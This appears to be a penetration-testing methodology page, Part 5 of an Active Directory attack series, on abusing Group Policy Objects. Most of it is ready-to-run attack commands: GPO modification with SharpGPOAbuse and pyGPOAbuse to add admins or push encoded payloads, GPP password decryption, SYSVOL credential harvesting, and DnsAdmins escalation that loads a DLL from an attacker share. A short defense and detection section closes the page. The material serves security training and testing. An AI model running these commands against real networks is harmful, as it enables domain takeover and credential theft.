@@ -1,0 +1,270 @@
+---
+title: "Part 5: Exploiting GPOs"
+description: "Group Policy Object abuse for privilege escalation, code execution, and persistence — GPO modification, GPP passwords, and SYSVOL harvesting."
+category: Methodology
+subcategory: Active Directory Attack
+order: 5
+tags: ["active-directory", "gpo", "group-policy", "privilege-escalation", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 5: Exploiting GPOs
+
+Group Policy Objects (GPOs) are AD's mechanism for pushing configuration to domain-joined machines. A GPO linked to an Organizational Unit (OU) affects every computer and user within that OU. If you can modify a GPO linked to an OU containing Domain Controllers or admin workstations, you achieve mass code execution across the environment.
+
+---
+
+## GPO Architecture
+
+A GPO consists of two parts:
+
+1. **Group Policy Container (GPC)** — An AD object under `CN=Policies,CN=System,DC=domain,DC=local`
+2. **Group Policy Template (GPT)** — Files stored in `\\domain.local\SYSVOL\domain.local\Policies\{GUID}\`
+
+The GPC stores metadata (links, version, status). The GPT stores the actual policy files (scripts, registry settings, etc.). Both must be writable for full GPO abuse.
+
+---
+
+## Enumeration
+
+### Find All GPOs and Their Links
+
+```powershell
+# List all GPOs
+Get-DomainGPO | select displayname, name, gpcfilesyspath
+
+# Which OUs is each GPO linked to?
+Get-DomainOU | select name, gplink
+
+# GPOs applied to a specific computer
+Get-DomainGPO -ComputerIdentity TARGET | select displayname
+
+# GPOs applied to a specific user
+Get-DomainGPO -UserIdentity targetuser | select displayname
+```
+
+### Find GPOs You Can Modify
+
+```powershell
+# Check for write permissions on GPO objects
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {
+  ($_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite") -and
+  ($_.SecurityIdentifier -match (Get-DomainUser -Identity youruser).objectsid)
+}
+
+# Check SYSVOL share permissions (GPT files)
+# If you can write to \\domain.local\SYSVOL\...\Policies\{GUID}\, you can modify the GPO
+
+# BloodHound — query for GPO control
+# "Shortest Paths to Domain Admins from Owned Principals" shows GPO abuse paths
+```
+
+```bash
+# CrackMapExec
+crackmapexec smb dc01 -u user -p pass -M gpp_password
+```
+
+---
+
+## Attack: GPO Modification for Code Execution
+
+**Severity:** 🔴 Critical
+
+If you have write access to a GPO, you can inject malicious configurations that execute on every machine in the linked OU.
+
+### Using SharpGPOAbuse
+
+```powershell
+# Add yourself as a local admin on all machines the GPO applies to
+SharpGPOAbuse.exe --AddLocalAdmin \
+  --UserAccount attackeruser \
+  --GPOName "Vulnerable GPO"
+
+# Create an immediate scheduled task (runs once on next GPO refresh)
+SharpGPOAbuse.exe --AddComputerTask \
+  --TaskName "Update" \
+  --Author "NT AUTHORITY\SYSTEM" \
+  --Command "cmd.exe" \
+  --Arguments "/c net localgroup administrators attackeruser /add" \
+  --GPOName "Vulnerable GPO"
+
+# Add a startup script
+SharpGPOAbuse.exe --AddComputerScript \
+  --ScriptName "update.bat" \
+  --ScriptContents "powershell -enc <base64_payload>" \
+  --GPOName "Vulnerable GPO"
+
+# Configure a user rights assignment (e.g., SeDebugPrivilege)
+SharpGPOAbuse.exe --AddUserRights \
+  --UserAccount attackeruser \
+  --Rights "SeTakeOwnershipPrivilege,SeDebugPrivilege" \
+  --GPOName "Vulnerable GPO"
+```
+
+### Using pyGPOAbuse (Linux)
+
+```bash
+pygpoabuse.py domain.local/user:pass \
+  -gpo-id "{GPO-GUID}" \
+  -command "net localgroup administrators attackeruser /add" \
+  -taskname "Update" -f
+```
+
+### Force GPO Refresh
+
+By default, GPOs refresh every 90 minutes (+ random offset up to 30 min). Force immediate application:
+
+```powershell
+# On a target machine (requires access)
+gpupdate /force
+
+# Remotely via WMI
+Invoke-GPUpdate -Computer TARGET -RandomDelayInMinutes 0
+```
+
+---
+
+## Attack: GPP (Group Policy Preferences) Passwords
+
+**Severity:** 🟠 High
+
+Before MS14-025 (2014), Group Policy Preferences could store encrypted passwords for local accounts, scheduled tasks, services, and drive mappings. Microsoft published the AES-256 key, so any domain user can decrypt these.
+
+Even though the patch prevents *new* GPP passwords, **old files often remain in SYSVOL**.
+
+### Locate GPP Files
+
+```bash
+# Search SYSVOL for cpassword attribute
+findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
+
+# Files to check:
+# Groups.xml          — Local group membership + passwords
+# Services.xml        — Service account passwords
+# Scheduledtasks.xml  — Scheduled task credentials
+# DataSources.xml     — Database connection strings
+# Drives.xml          — Mapped drive credentials
+# Printers.xml        — Printer connection credentials
+```
+
+### Decrypt
+
+```bash
+# gpp-decrypt (Kali built-in)
+gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+# CrackMapExec module
+crackmapexec smb dc01 -u user -p pass -M gpp_password
+
+# Metasploit
+use auxiliary/scanner/smb/smb_enum_gpp
+
+# PowerSploit
+Get-GPPPassword
+```
+
+### Example Groups.xml
+
+```xml
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+        name="LocalAdmin"
+        image="2"
+        changed="2019-05-12 08:30:14"
+        uid="{CE123456-1234-1234-1234-123456789012}">
+    <Properties action="U"
+                newName=""
+                fullName=""
+                description=""
+                cpassword="edBSHOwhZLTjt/QS9FeIcJ83..."
+                changeLogon="0"
+                noChange="1" />
+  </User>
+</Groups>
+```
+
+---
+
+## Attack: SYSVOL Script Harvesting
+
+Even without GPP passwords, SYSVOL often contains scripts with hardcoded credentials:
+
+```bash
+# Search for credentials in SYSVOL scripts
+findstr /S /I "password\|passwd\|pwd\|credential\|secret" \\domain.local\sysvol\*.bat
+findstr /S /I "password\|passwd\|pwd\|credential\|secret" \\domain.local\sysvol\*.ps1
+findstr /S /I "password\|passwd\|pwd\|credential\|secret" \\domain.local\sysvol\*.vbs
+
+# Download everything for offline analysis
+smbclient //dc01/SYSVOL -U user%pass -c "recurse; prompt; mget *"
+```
+
+---
+
+## Attack: DNS Admins Privilege Escalation
+
+Members of the **DnsAdmins** group can configure the DNS service to load an arbitrary DLL — and the DNS service runs as SYSTEM on Domain Controllers.
+
+```powershell
+# Check group membership
+Get-DomainGroupMember "DnsAdmins"
+
+# Host malicious DLL on an SMB share
+# DLL: reverse shell or adds you to Domain Admins
+
+# Configure DNS to load the DLL
+dnscmd dc01.domain.local /config /serverlevelplugindll \\attacker\share\evil.dll
+
+# Restart DNS service (requires Server Operators or similar)
+sc \\dc01.domain.local stop dns
+sc \\dc01.domain.local start dns
+```
+
+> ⚠️ **Risk:** This can crash the DNS service and break domain resolution. Use with caution.
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| **Restrict GPO edit permissions** | Unauthorized GPO modification |
+| **Clean SYSVOL** of old GPP files | GPP password extraction |
+| **AGPM** (Advanced Group Policy Management) | Change control for GPO edits |
+| **Remove users from DnsAdmins** | DNS DLL injection |
+| **Audit SYSVOL scripts** for credentials | Credential harvesting |
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **5136** | Directory service object modified (GPO changes) |
+| **5137** | Directory service object created (new GPOs) |
+| **4670** | Permissions changed on object |
+| **770 / 771** (DNS Server) | DNS configuration changes |
+
+### Monitoring
+
+```powershell
+# Alert on GPO modifications — compare GPO versions
+Get-DomainGPO | select displayname, versionnumber, whenchanged | sort whenchanged -Descending
+
+# Baseline SYSVOL and alert on changes
+# Use file integrity monitoring on \\domain.local\SYSVOL\
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 6: Exploiting AD Certificate Services](/docs/methodology/active-directory-attack/06-certificates)** — ESC1 through ESC11, the full ADCS attack matrix.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
